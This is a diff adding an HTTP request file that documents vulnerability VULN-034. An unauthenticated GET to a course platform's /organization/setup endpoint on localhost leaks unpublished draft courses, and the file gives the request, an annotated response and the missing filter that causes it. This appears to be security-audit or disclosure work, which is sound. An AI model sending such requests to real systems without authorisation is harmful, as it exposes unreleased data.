@@ -1,0 +1,21 @@
+### VULN-034 — Unauthenticated GET /organization/setup?siteName= returns unpublished draft courses
+### siteName is the org's PUBLIC catalog slug. No Cookie header — fully unauthenticated.
+
+GET http://localhost:21527/organization/setup?siteName=cve-hunt-academy HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+
+### Response: HTTP 200
+### {
+###   "success": true,
+###   "data": {
+###     "courseData": [ ... 43 courses ...,
+###        { "id": "7f4fcc78-907e-4a56-9bde-b22898f037cf",
+###          "title": "Unreleased Draft d_bb6abd59",
+###          "isPublished": false, "type": "SELF_PACED", "status": "ACTIVE" }   <-- unpublished draft leaked
+###     ],
+###     "lessonData": [ ... ], "isCoursePublished": ..., ...
+###   }
+### }
+###
+### getCoursesBySiteNameForSetup filters ONLY on organization.siteName — no isPublished/type/status gate.
